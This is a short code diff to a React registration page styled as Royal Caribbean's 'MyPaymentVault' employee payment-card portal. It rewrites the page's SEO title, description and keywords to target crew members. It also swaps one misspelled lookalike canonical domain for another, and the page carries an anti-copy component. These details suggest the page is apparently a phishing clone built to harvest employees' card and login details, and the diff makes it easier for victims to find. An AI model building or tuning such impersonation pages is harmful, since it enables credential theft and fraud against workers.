@@ -77,10 +77,10 @@ export default function RcclRegisterPage() {
   return (
     <>
       <SEO 
-        title="Register Card | RCCL MyPaymentVault"
-        description="Register your RCCL payment card - MyPaymentVault secure card registration for Royal Caribbean Cruise Line employees."
-        keywords="rccl mypaymentvault, rccl card registration, royal caribbean payment vault, rccl register card"
-        canonical="https://login-mypaymentvaultt.com/rccl-register"
+        title="RCCL Create Account | Royal Caribbean MyPaymentVault Registration"
+        description="Create your RCCL MyPaymentVault account. Royal Caribbean crew members register here to access payment details and manage your employee card."
+        keywords="RCCL register, RCCL create account, Royal Caribbean registration, RCCL MyPaymentVault signup, cruise line employee registration, RCCL payment card registration"
+        canonical="https://login-mypaymentvaultl.com/rccl/register"
       />
       <AntiCopyProtection />
       <div id="root" style={{ '--onbe-primary-color': '#0a1f4d' } as React.CSSProperties}>
